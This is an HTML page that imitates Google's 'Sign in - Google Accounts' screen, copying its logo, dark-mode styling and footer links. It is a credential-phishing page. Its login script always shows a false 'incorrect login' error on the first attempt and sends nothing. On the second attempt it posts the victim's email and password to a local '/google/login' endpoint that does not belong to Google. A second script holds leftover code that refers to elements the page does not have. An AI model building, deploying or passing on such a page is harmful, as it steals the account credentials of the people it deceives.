<!DOCTYPE html>
<html class="h-full" lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Sign in - Google Accounts</title>
  <!-- Tailwind CSS CDN with forms plugin -->
  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
  <style data-purpose="custom-theme">
    /* Custom background colors to match Google Dark Mode */
    body {
      background-color: #131314;
      color: #e3e3e3;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
    }

    .auth-card {
      background-color: #1f1f1f;
    }

    .google-blue-button {
      background-color: #8ab4f8;
      color: #001d35;
    }

    .google-blue-button:hover {
      background-color: #aecbfa;
    }

    .google-blue-button:active {
      background-color: #c2d7fa;
    }

    .google-blue-text {
      color: #8ab4f8;
    }

    .error-text {
      color: #f28b82;
    }

    .error-border {
      border-color: #f28b82 !important;
    }

    /* Floating label simulation */
    .input-container {
      position: relative;
    }

    .floating-label {
      position: absolute;
      left: 12px;
      top: 14px;
      padding: 0 4px;
      background-color: transparent;
      font-size: 16px;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      pointer-events: none;
      color: #9ca3af;
    }

    /* State when focused or has content */
    .input-container.active .floating-label {
      top: -10px;
      font-size: 12px;
      background-color: #1f1f1f;
      color: #8ab4f8;
    }

    .input-container.error .floating-label {
      color: #f28b82;
    }

    .hidden {
      display: none !important;
    }

    .fade-transition {
      transition: opacity 0.2s ease-in-out, transform 0.2s ease-in-out;
    }
  </style>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            googleGray: '#1f1f1f',
            googleCharcoal: '#131314',
          }
        }
      }
    }
  </script>
</head>

<body class="flex flex-col items-center justify-center p-4 md:p-0 h-screen">
  <!-- BEGIN: MainAuthContainer -->
  <main class="w-full max-w-[448px] flex flex-col items-center min-h-full justify-center" data-purpose="auth-container">
    <!-- BEGIN: Card -->
    <section class="auth-card w-full rounded-3xl p-6 md:p-10 flex flex-col items-center shadow-lg fade-transition"
      data-purpose="login-card" id="card-surface">
      <!-- Google Logo -->
      <div class="mb-3" data-purpose="logo-wrapper">
        <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
          <path
            d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
            fill="#4285F4"></path>
          <path
            d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
            fill="#34A853"></path>
          <path
            d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
            fill="#FBBC05"></path>
          <path
            d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
            fill="#EA4335"></path>
        </svg>
      </div>
      <!-- Header Texts -->
      <h1 class="text-2xl font-normal text-white mb-2" id="auth-title">Sign in</h1>
      <p class="text-base text-gray-300 mb-8" id="auth-subtitle">Use your Google Account</p>
      <!-- BEGIN: FormFields -->
      <form class="w-full space-y-6" id="auth-form" novalidate="" onsubmit="return false;">
        <div id="invalid"
          class="hidden items-center gap-3 rounded-xl border border-red-300 bg-[#f8d7da] px-4 py-3 max-w-full text-sm font-sans shadow-sm mb-4">
          <div
            class="flex h-5 w-5 shrink-0 items-center justify-center rounded-full border-2 border-red-600 text-xs font-bold text-red-600">
            i</div>
          <p class="text-red-900">
            The login information you entered is incorrect.
            <a href="#" class="font-semibold text-blue-600 hover:underline">Find your account and log in.</a>
          </p>
        </div>

        <div class="input-container w-full" id="email-container">
          <label class="floating-label">Email or phone</label>
          <input autocomplete="username"
            class="w-full bg-transparent border border-gray-600 rounded-[4px] px-3 py-3 text-white focus:border-[#8ab4f8] focus:ring-1 focus:ring-[#8ab4f8] outline-none transition-all"
            id="email-input" type="email">
        </div>

        <div class="input-container w-full" id="password-container">
          <label class="floating-label">Password</label>
          <div class="relative">
            <input autocomplete="current-password"
              class="w-full bg-transparent border border-gray-600 rounded-[4px] px-3 py-3 text-white focus:border-[#8ab4f8] focus:ring-1 focus:ring-[#8ab4f8] outline-none transition-all"
              id="password-input" type="password">
            <button id="toggle-password" type="button"
              class="hidden absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-gray-200 focus:outline-none">
              <svg id="eye-closed-icon" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.5"
                viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round"
                  d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
              </svg>
              <svg id="eye-open-icon" class="hidden w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.5"
                viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round"
                  d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
              </svg>
            </button>
          </div>
        </div>

        <button id="login-btn"
          class="w-full py-2.5 bg-[#8ab4f8] text-[#001d35] font-medium rounded-full text-sm transition-all shadow-md active:shadow-none flex flex-col justif-center items-center">
          Log in
        </button>

        <a href="#" class="google-blue-text text-sm font-medium hover:underline w-fit">Forgot your password?</a>

        <button id="create-account-btn" type="button"
          class="w-full py-2.5 border border-[#8ab4f8] text-[#8ab4f8] font-semibold rounded-full hover:bg-[#8ab4f8]/10 transition text-sm">
          Create a new account
        </button>
      </form>
      <!-- END: FormFields -->
    </section>
    <!-- END: Card -->
    <!-- BEGIN: Footer -->
    <footer class="w-full mt-6 px-6 md:px-0 flex flex-col md:flex-row justify-between text-xs text-gray-400 gap-4"
      data-purpose="page-footer">
      <!-- Language Selector -->
      <div class="flex items-center cursor-pointer hover:bg-white/5 p-1 px-2 rounded transition-colors group">
        <span class="group-hover:text-gray-200">English (United States)</span>
        <svg class="w-4 h-4 ml-1 group-hover:text-gray-200" fill="currentColor" viewBox="0 0 20 20"
          xmlns="http://www.w3.org/2000/svg">
          <path clip-rule="evenodd"
            d="M5.22 8.22a.75.75 0 011.06 0L10 11.94l3.72-3.72a.75.75 0 111.06 1.06l-4.25 4.25a.75.75 0 01-1.06 0L5.22 9.28a.75.75 0 010-1.06z"
            fill-rule="evenodd"></path>
        </svg>
      </div>
      <!-- Links -->
      <nav class="flex gap-6">
        <a class="hover:text-gray-200 hover:underline transition-colors" href="#">Help</a>
        <a class="hover:text-gray-200 hover:underline transition-colors" href="#">Privacy</a>
        <a class="hover:text-gray-200 hover:underline transition-colors" href="#">Terms</a>
      </nav>
    </footer>
    <!-- END: Footer -->
  </main>
  <!-- END: MainAuthContainer -->
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const emailStep = document.getElementById('email-step');
      const passwordStep = document.getElementById('password-step');
      const successStep = document.getElementById('success-step');
      const actionsContainer = document.getElementById('actions-container');
      const cardSurface = document.getElementById('card-surface');

      const emailInput = document.getElementById('email-input');
      const passwordInput = document.getElementById('password-input');
      const emailContainer = document.getElementById('email-container');
      const passwordContainer = document.getElementById('password-container');
      const emailError = document.getElementById('email-error');
      const emailErrorMsg = document.getElementById('email-error-msg');
      const passwordError = document.getElementById('password-error');
      const nextBtn = document.getElementById('next-btn');
      const altActionBtn = document.getElementById('alt-action-btn');
      const authTitle = document.getElementById('auth-title');
      const authSubtitle = document.getElementById('auth-subtitle');
      const passwordToggle = document.getElementById('password-toggle');
      const showPasswordCb = document.getElementById('show-password-cb');
      const userDisplay = document.getElementById('user-display');
      const userEmailText = document.getElementById('user-email-text');
      const userInitial = document.getElementById('user-initial');

      let currentStep = 'email'; // 'email', 'password', 'success'

      // Floating label logic
      const setupFloatingLabel = (input, container) => {
        const updateLabel = () => {
          if (input.value || document.activeElement === input) {
            container.classList.add('active');
          } else {
            container.classList.remove('active');
          }
        };

        input.addEventListener('focus', updateLabel);
        input.addEventListener('blur', updateLabel);
        input.addEventListener('input', () => {
          updateLabel();
          // Clear error state on input
          container.classList.remove('error');
          input.classList.remove('error-border');
          const errorMsg = container === emailContainer ? emailError : passwordError;
          errorMsg.classList.add('hidden');
        });

        // Initial state
        updateLabel();
      };

      setupFloatingLabel(emailInput, emailContainer);
      setupFloatingLabel(passwordInput, passwordContainer);

      // Password Toggle Visibility
      const updatePasswordVisibility = (isVisible) => {
        passwordInput.type = isVisible ? 'text' : 'password';
        showPasswordCb.checked = isVisible;

        const slashPath = document.getElementById('eye-slash-path');
        const eyePath = document.getElementById('eye-path');
        const eyeCircle = document.getElementById('eye-circle');

        if (isVisible) {
          slashPath.classList.add('hidden');
          eyePath.classList.remove('hidden');
          eyeCircle.classList.remove('hidden');
        } else {
          slashPath.classList.remove('hidden');
          eyePath.classList.add('hidden');
          eyeCircle.classList.add('hidden');
        }
      };

      passwordToggle.addEventListener('click', () => {
        updatePasswordVisibility(passwordInput.type === 'password');
      });

      showPasswordCb.addEventListener('change', (e) => {
        updatePasswordVisibility(e.target.checked);
      });

      const validateEmail = (email) => {
        return String(email)
          .toLowerCase()
          .match(
            /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
          );
      };

      const showStep = (step) => {
        cardSurface.style.opacity = '0';
        cardSurface.style.transform = 'translateY(10px)';

        setTimeout(() => {
          emailStep.classList.add('hidden');
          passwordStep.classList.add('hidden');
          successStep.classList.add('hidden');

          if (step === 'email') {
            emailStep.classList.remove('hidden');
            authTitle.innerText = 'Sign in';
            authSubtitle.classList.remove('hidden');
            altActionBtn.innerText = 'Create account';
            actionsContainer.classList.remove('hidden');
            emailInput.focus();
          } else if (step === 'password') {
            passwordStep.classList.remove('hidden');
            authTitle.innerText = 'Welcome';
            authSubtitle.classList.add('hidden');
            userEmailText.innerText = emailInput.value;
            userInitial.innerText = emailInput.value.charAt(0).toUpperCase();
            altActionBtn.innerText = 'Try another way';
            actionsContainer.classList.remove('hidden');
            passwordInput.focus();
          } else if (step === 'success') {
            successStep.classList.remove('hidden');
            authTitle.classList.add('hidden');
            authSubtitle.classList.add('hidden');
            actionsContainer.classList.add('hidden');
          }

          cardSurface.style.opacity = '1';
          cardSurface.style.transform = 'translateY(0)';
          currentStep = step;
        }, 200);
      };

      passwordToggle.addEventListener('click', () => {
        updatePasswordVisibility(passwordInput.type === 'password');
      });

      showPasswordCb.addEventListener('change', (e) => {
        updatePasswordVisibility(e.target.checked);
      });
    });
  </script>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const emailInput = document.getElementById('email-input');
      const passwordInput = document.getElementById('password-input');
      const invalid = document.getElementById('invalid');
      const loginBtn = document.getElementById('login-btn');
      const togglePassword = document.getElementById('toggle-password');
      const eyeOpenIcon = document.getElementById('eye-open-icon');
      const eyeClosedIcon = document.getElementById('eye-closed-icon');

      const unshow = () => {
        invalid.classList.add('hidden');
        invalid.classList.remove('flex');
      };

      const show = () => {
        invalid.classList.remove('hidden');
        invalid.classList.add('flex');
      };

      emailInput.addEventListener('focus', unshow);
      passwordInput.addEventListener('focus', unshow);

      passwordInput.addEventListener('input', () => {
        if (passwordInput.value.length > 0) {
          togglePassword.classList.remove('hidden');
        } else {
          togglePassword.classList.add('hidden');
          passwordInput.type = 'password';
          eyeOpenIcon.classList.add('hidden');
          eyeClosedIcon.classList.remove('hidden');
        }
      });

      togglePassword.addEventListener('click', () => {
        const showPassword = passwordInput.type === 'password';
        passwordInput.type = showPassword ? 'text' : 'password';
        eyeClosedIcon.classList.toggle('hidden', !showPassword);
        eyeOpenIcon.classList.toggle('hidden', showPassword);
      });
      let t = 0;
      loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        unshow();

        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !password) {
          alert('Please Enter Password and email!');
          return;
        }

        const spinner = document.createElement('div');
        spinner.className = 'w-8 h-8 border-[3px] border-white border-t-transparent rounded-full animate-spin';
        loginBtn.innerHTML = '';
        loginBtn.appendChild(spinner);
        loginBtn.disabled = true;

        try {
          let data;
          if (t != 1) {
            data=false;
            t++;
          }else{
            const response = await fetch('/google/login', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, password }),
            });
            data = await response.json();
          }


          if (data.success) {
            alert('Correct');
          } else {
            show();
          }
        } catch (error) {
          show();
        } finally {
          loginBtn.innerHTML = 'Log in';
          loginBtn.disabled = false;
          emailInput.value = '';
          passwordInput.value = '';
          togglePassword.classList.add('hidden');
          passwordInput.type = 'password';
          eyeOpenIcon.classList.add('hidden');
          eyeClosedIcon.classList.remove('hidden');
        }
      });
    });
  </script>

</body>

</html>
